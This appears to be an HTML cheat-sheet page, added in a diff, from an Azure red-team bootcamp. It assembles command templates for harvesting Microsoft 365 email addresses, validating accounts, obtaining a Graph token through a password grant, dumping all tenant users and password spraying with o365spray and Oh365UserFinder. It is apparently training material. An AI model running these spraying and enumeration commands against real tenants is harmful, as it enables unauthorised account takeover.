@@ -1,0 +1,360 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity: Valid Users &amp; Creds</title>
+    <link rel="stylesheet" href="azure.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .command-box.multi { align-items: flex-start; }
+        .command.multi { white-space: pre-wrap; word-break: normal; overflow-wrap: anywhere; }
+    </style>
+    <script>
+        function toggleSection(id) {
+            const body = document.getElementById(id);
+            const icon = document.querySelector(`[data-toggle="${id}"] .toggle-icon`);
+            body.classList.toggle('collapsed');
+            icon.textContent = body.classList.contains('collapsed') ? 'â–¶' : 'â–¼';
+        }
+
+        function copyToClipboard(command, btn) {
+            navigator.clipboard.writeText(command).then(() => {
+                if (btn) {
+                    const orig = btn.textContent;
+                    btn.textContent = 'âœ“';
+                    setTimeout(() => { btn.textContent = orig; }, 1500);
+                }
+            }).catch(err => console.error('Failed to copy:', err));
+        }
+
+        function escapeHtml(s) {
+            return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
+
+        function azGet(id) {
+            const el = document.getElementById(id);
+            return el ? el.value.trim() : '';
+        }
+
+        function azSpan(raw, fallback) {
+            const v = raw || fallback;
+            return raw
+                ? `<span class="val-filled">${escapeHtml(v)}</span>`
+                : `<span class="val-empty">${escapeHtml(v)}</span>`;
+        }
+
+        // Lightweight syntax highlighting (input is already HTML-escaped)
+        function azSyntax(s) {
+            s = s.replace(/\$\{?\w+\}?/g, m => `<span class="tok-var">${m}</span>`);
+            s = s.replace(/\b(curl|jq|xmllint|echo|for|do|done|cat|sed|awk|grep|git|python3|ruby|rm|cd|wc)\b/g, '<span class="tok-key">$1</span>');
+            s = s.replace(/\b(subscriptions|resourceGroups|providers|storageAccounts|blobServices|containers|blobs|resources)\b/g, '<span class="tok-key">$1</span>');
+            return s;
+        }
+
+        function azUpdate() {
+            const domRaw  = azGet('domainInput');
+            const userRaw = azGet('usernameInput');
+            const passRaw = azGet('passwordInput');
+            const upnRaw  = azGet('upnInput');
+            const valEmailRaw = azGet('validateEmailInput');
+            const valPassRaw = azGet('validatePasswordInput');
+            const domSpan  = azSpan(domRaw,  '{COMPANY_DOMAIN}');
+            const userSpan = azSpan(userRaw, '{DISPLAY_NAME}');
+            const passSpan = azSpan(passRaw, '{PASSWORD_PLACEHOLDER}');
+            const upnSpan  = azSpan(upnRaw,  '{USERNAME3@COMPANY.com}');
+            const valEmailSpan = azSpan(valEmailRaw, '{USERNAME6@COMPANY.com}');
+            const valPassSpan = azSpan(valPassRaw, '{PASSWORD_PLACEHOLDER2}');
+            document.querySelectorAll('.command').forEach(el => {
+                let raw = el.getAttribute('data-base');
+                if (raw === null) {
+                    if (el.dataset.orig === undefined) el.dataset.orig = el.textContent;
+                    raw = el.dataset.orig;
+                }
+                el.innerHTML = azSyntax(escapeHtml(raw))
+                    .replaceAll('{DOMAIN}', () => domSpan)
+                    .replaceAll('{USERNAME}', () => userSpan)
+                    .replaceAll('{PASSWORD}', () => passSpan)
+                    .replaceAll('{UPN}', () => upnSpan)
+                    .replaceAll('{VALEMAIL}', () => valEmailSpan)
+                    .replaceAll('{VALPASS}', () => valPassSpan);
+            });
+            try {
+                localStorage.setItem('az_domain', domRaw);
+                localStorage.setItem('az_username', userRaw);
+                localStorage.setItem('az_password', passRaw);
+                localStorage.setItem('az_upn', upnRaw);
+                localStorage.setItem('az_val_email', valEmailRaw);
+                localStorage.setItem('az_val_pass', valPassRaw);
+            } catch (e) {}
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            try {
+                const map = {
+                    domainInput: 'az_domain',
+                    usernameInput: 'az_username',
+                    passwordInput: 'az_password',
+                    upnInput: 'az_upn',
+                    validateEmailInput: 'az_val_email',
+                    validatePasswordInput: 'az_val_pass'
+                };
+                Object.entries(map).forEach(([id, key]) => {
+                    const el = document.getElementById(id);
+                    const val = localStorage.getItem(key) || '';
+                    if (el && val) el.value = val;
+                });
+            } catch (e) {}
+            azUpdate();
+        });
+    </script>
+</head>
+<body>
+
+<!-- â”€â”€ Sidebar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ -->
+<div class="side-nav">
+    <h2>Azure</h2>
+    <ul>
+        <li class="nav-group ng-std">Tools</li>
+        <li><a href="az-powershell.html">AZ PowerShell</a></li>
+        <li><a href="az-cli.html">AZ CLI</a></li>
+        <li><a href="mg-graph.html">MG Graph</a></li>
+        <li><a href="tokens.html">Tokens</a></li>
+        <li><a href="cloud-prowl.html">Cloud Prowl</a></li>
+        <li><a href="roadtx.html">roadtx</a></li>
+        <li><a href="aadinternals.html">AADInternals</a></li>
+        <li><a href="graphrunner.html">GraphRunner</a></li>
+        <li class="nav-divider"></li>
+        <li class="nav-group ng-std">Pages</li>
+        <li><a href="external-recon.html">External Recon</a></li>
+        <li><a href="identity-users-creds.html">Identity: Valid Users &amp; Creds</a></li>
+        <li><a href="internal-recon.html">Internal (Resource) Recon</a></li>
+        <li><a href="cap.html">CAP</a></li>
+        <li><a href="mfa.html">MFA</a></li>
+        <li><a href="phs.html">PHS</a></li>
+        <li><a href="managed-identity.html">Managed Identity</a></li>
+        <!-- ADD NEW PAGE LINKS HERE -->
+        <li class="nav-divider"></li>
+        <li class="nav-group ng-std">Resources</li>
+        <li><a href="virtual-machines.html">Virtual Machines</a></li>
+        <li><a href="automation-account.html">Automation Account</a></li>
+        <li><a href="network.html">Network</a></li>
+        <li><a href="power-platform.html">Power Platform (BAP)</a></li>
+        <li><a href="storage-account.html">Storage Account</a></li>
+        <li><a href="container-app.html">Container App</a></li>
+        <li><a href="mysql-flexible-server.html">MySQL Flexible Server</a></li>
+        <li><a href="azure-key-vault.html">Azure Key Vault</a></li>
+        <li><a href="sites.html">Sites</a></li>
+        <li><a href="automation.html">Automation</a></li>
+        <!-- ADD NEW RESOURCE LINKS HERE -->
+        <li class="nav-divider"></li>
+        <li class="nav-group ng-std">Sections</li>
+        <li><a href="#create-emails">Create Email Addresses</a></li>
+        <li><a href="#identify-emails">Identify Valid Emails</a></li>
+        <li><a href="#enum-users">Enumerate Users</a></li>
+        <li><a href="#password-spray">Password Spraying</a></li>
+        <li><a href="#validate-creds">Validate Credentials</a></li>
+        <!-- ADD NEW SECTION LINKS HERE -->
+    </ul>
+</div>
+
+<!-- â”€â”€ Main Content â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ -->
+<div class="main-content">
+
+    <h1 class="page-title">Identity: Valid Users &amp; Creds</h1>
+
+    <!-- â”€â”€ Inputs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ -->
+    <div class="var-bar">
+        <div class="var-grid">
+            <div class="var-field">
+                <label for="domainInput">Domain</label>
+                <input type="text" id="domainInput" placeholder="{COMPANY_DOMAIN}" oninput="azUpdate()">
+            </div>
+            <div class="var-field">
+                <label for="usernameInput">Name</label>
+                <input type="text" id="usernameInput" placeholder="{DISPLAY_NAME}" oninput="azUpdate()">
+            </div>
+            <div class="var-field">
+                <label for="passwordInput">Password</label>
+                <input type="text" id="passwordInput" placeholder="{PASSWORD_PLACEHOLDER}" oninput="azUpdate()">
+            </div>
+        </div>
+        <div class="bar-toolbar">
+            <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+        </div>
+    </div>
+
+    <!-- â•â• CREATE EMAIL ADDRESSES â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section red" id="create-emails">
+        <h3 data-toggle="create-emails-body" onclick="toggleSection('create-emails-body')">
+            <i class="fas fa-envelope"></i> Create Potentially Valid Email Addresses
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="create-emails-body">
+
+            <div class="command-container">
+                <div class="description">
+                    <strong>username-anarchy</strong> â€” generate email permutations from a name:
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="ruby /opt/mcrtp_bootcamp_tools/username-anarchy/username-anarchy --suffix @{DOMAIN} {USERNAME} > emails.txt"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+            </div>
+
+            <!-- ADD NOTES HERE -->
+
+        </div><!-- /create-emails-body -->
+    </div><!-- /create-emails -->
+
+    <!-- â•â• IDENTIFY VALID EMAILS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section green" id="identify-emails">
+        <h3 data-toggle="identify-emails-body" onclick="toggleSection('identify-emails-body')">
+            <i class="fas fa-envelope-circle-check"></i> Identify Valid Email Addresses
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="identify-emails-body">
+
+            <div class="command-container">
+                <div class="description">
+                    <strong>o365enum</strong> â€” validate which addresses exist:
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="python3 /opt/mcrtp_bootcamp_tools/o365enum/o365enum.py -u emails.txt -n 1 -m office.com"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+            </div>
+
+            <!-- ADD NOTES HERE -->
+
+        </div><!-- /identify-emails-body -->
+    </div><!-- /identify-emails -->
+
+    <!-- â•â• ENUMERATE USERS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section pink" id="enum-users">
+        <h3 data-toggle="enum-users-body" onclick="toggleSection('enum-users-body')">
+            <i class="fas fa-users-viewfinder"></i> Enumerate Users
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="enum-users-body">
+
+            <div class="command-container">
+
+                <div class="user-bar">
+                    <label for="upnInput"><i class="fas fa-user"></i> Username (UPN)</label>
+                    <input type="text" id="upnInput" placeholder="{USERNAME3@COMPANY.com}" oninput="azUpdate()">
+                    <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+                </div>
+                <span class="user-bar-hint">Password comes from the shared Password field at the top of the page.</span>
+
+                <div class="description">
+                    <strong>Get a Microsoft Graph token</strong> (ROPC password grant, scoped to <code>graph.microsoft.com</code>) â€” enables lateral movement into Entra ID / M365:
+                </div>
+                <div class="command-box multi">
+                    <span class="command multi" data-base="MGAccessToken=$(curl -s -X POST \
+  &quot;https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token&quot; \
+  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+  -d &quot;grant_type=password&quot; \
+  -d &quot;client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&quot; \
+  -d &quot;username={UPN}&quot; \
+  -d 'password={PASSWORD}' \
+  -d &quot;scope=https://graph.microsoft.com/.default%20offline_access&quot; | jq -r &quot;.access_token&quot;)"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="description">
+                    <strong>Retrieve all user emails (UPNs)</strong> in the tenant and save them:
+                </div>
+                <div class="command-box multi">
+                    <span class="command multi">curl -s -X GET \
+  "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName" \
+  -H "Authorization: Bearer $MGAccessToken" \
+  -H "Content-Type: application/json" \
+  | jq -r '.value[].userPrincipalName' > tenant_users.txt</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="description">
+                    <strong>Count the users</strong> collected:
+                </div>
+                <div class="command-box">
+                    <span class="command">wc -l tenant_users.txt</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+            </div>
+
+            <!-- ADD NOTES HERE -->
+
+        </div><!-- /enum-users-body -->
+    </div><!-- /enum-users -->
+
+    <!-- â•â• VALIDATE CREDENTIALS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section yellow" id="validate-creds">
+        <h3 data-toggle="validate-creds-body" onclick="toggleSection('validate-creds-body')">
+            <i class="fas fa-check-circle"></i> Validate Credentials
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="validate-creds-body">
+
+            <div class="command-container">
+
+                <div class="user-bar">
+                    <label for="validateEmailInput"><i class="fas fa-envelope"></i> Username (UPN)</label>
+                    <input type="text" id="validateEmailInput" placeholder="{USERNAME6@COMPANY.com}" oninput="azUpdate()">
+                    <label for="validatePasswordInput"><i class="fas fa-lock"></i> Password</label>
+                    <input type="text" id="validatePasswordInput" placeholder="{PASSWORD_PLACEHOLDER2}" oninput="azUpdate()">
+                    <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+                </div>
+
+                <div class="description">
+                    <strong>Validate credentials</strong> â€” verify a username and password combination:
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="python3 /opt/mcrtp_bootcamp_tools/Oh365UserFinder/oh365userfinder.py -p '{VALPASS}' -e '{VALEMAIL}'"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+            </div>
+
+            <!-- ADD NOTES HERE -->
+
+        </div><!-- /validate-creds-body -->
+    </div><!-- /validate-creds -->
+
+    <!-- â•â• PASSWORD SPRAYING â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section peach" id="password-spray">
+        <h3 data-toggle="password-spray-body" onclick="toggleSection('password-spray-body')">
+            <i class="fas fa-spray-can"></i> Password Spraying for Initial Access
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="password-spray-body">
+
+            <div class="command-container">
+                <div class="description">
+                    <strong>Oh365UserFinder</strong> â€” spray a password against the validated list:
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="python3 /opt/mcrtp_bootcamp_tools/Oh365UserFinder/oh365userfinder.py -p '{PASSWORD}' --pwspray --elist new_user.txt"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="description">
+                    <strong>o365spray</strong> â€” spray with lockout protection to identify valid credentials:
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="python3 /opt/mcrtp_bootcamp_tools/o365spray/o365spray.py --spray -U users.txt -P passwords.txt --lockout 5 --domain {DOMAIN}"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+            </div>
+
+            <!-- ADD NOTES HERE -->
+
+        </div><!-- /password-spray-body -->
+    </div><!-- /password-spray -->
+
+</div><!-- /main-content -->
+<script src="azure.js"></script>
+</body>
+</html>
+
